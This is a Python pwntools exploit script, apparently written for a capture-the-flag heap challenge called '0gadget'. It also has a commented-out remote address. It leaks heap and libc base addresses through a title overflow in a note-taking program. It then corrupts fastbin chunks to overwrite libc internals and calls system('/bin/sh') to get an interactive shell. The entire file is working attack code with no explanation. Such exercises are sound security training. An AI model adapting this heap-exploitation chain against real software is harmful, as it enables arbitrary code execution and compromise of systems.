#!/usr/bin/env python
# coding=utf-8
from pwn import *
# context.log_level='debug'
p=process('./0gadget')
#p=remote("106.75.63.193",9705)
def remark(remark):
    p.sendafter("REMARK: ",remark)
def add(size,title,content,mark='add'):
    p.sendlineafter('Your choice: ','1')
    p.sendlineafter("please input the note size: ",str(size))
    if (len(title)<=0x90):
        title=title.strip('\n')+'\n'
    p.sendafter("Please input the title: ",title)
    p.sendafter("Please input the content: ",content)
    remark(mark)
def delete(index,mark='delete'):
    p.sendlineafter('Your choice: ','2')
    p.sendlineafter("Which Note do you want to delete: ",str(index))
    remark(mark)
def deletee(index,mark='delete'):
    p.sendlineafter('Your choice: ','2')
    p.sendlineafter("Which Note do you want to delete: ",str(index))
    # remark(mark)
def show(index,mark='show'):
    p.sendlineafter('Your choice: ','3')
    p.sendlineafter("Which Note do you want to show: ",str(index))
add(0x20,'t0','c0')
add(0x20,'t1','c1')
add(0x20,'t2','c2')
add(0x20,'t3'.ljust(0x90)+'\x10','c3')
delete(1)
delete(0)
show(3)
p.recvuntil("content: ")
heapbase=u64(p.recv(8))-0x30
remark('show')

delete(2)
delete(3)

add(0x10,'t0'.ljust(0x90)+'\xf0','c0')
add(0x100,'t1','c1')
add(0x10,'t2','c2')

delete(1)
show(0)
p.recvuntil("content: ")
libcbase=u64(p.recv(8))-0x3c4b78
remark("show")

add(0x20,'t1',p64(0x81)+p64(0))
add(0x20,'t3','c3')
add(0x20,'t4','c4')

add(0x100,'t5','c5')

add(0x70,'t6','c6')
add(0x70,'t7'.ljust(0x90)+'\x20','c7')
add(0x70,'t8','c8')

delete(6)
delete(8)
delete(7)

log.info("heapbase: 0x%x  libcbase: 0x%x"%(heapbase,libcbase))

add(0x70,'t6',p64(libcbase+0x3c4b28))
add(0x70,'t7','c7')
add(0x70,'t8','c8')

add(0x70,'t9',p64(0)*8+p64(libcbase+0x3c5c50))

add(0x100,'t10','c10')
add(0x100,'t11','c11')
add(0x100,'t12','c12')
add(0x100,'t13','c13')
add(0x100,'t14','c14')
add(0x100,'t15','c15')
delete(4)
add(0x100,'t4','c4')
delete(3)
add(0x100,'t3','c3')
delete(0)
add(0x100,'t0','c0')
delete(2)
add(0x100,'t2','c2')
delete(7)
add(0x100,'t7','c7')
delete(1)
add(0x100,'t1','/bin/sh'.ljust(0xa8,'\x00')+p64(libcbase+0x45390))
deletee(1)
# gdb.attach(p)
p.interactive()
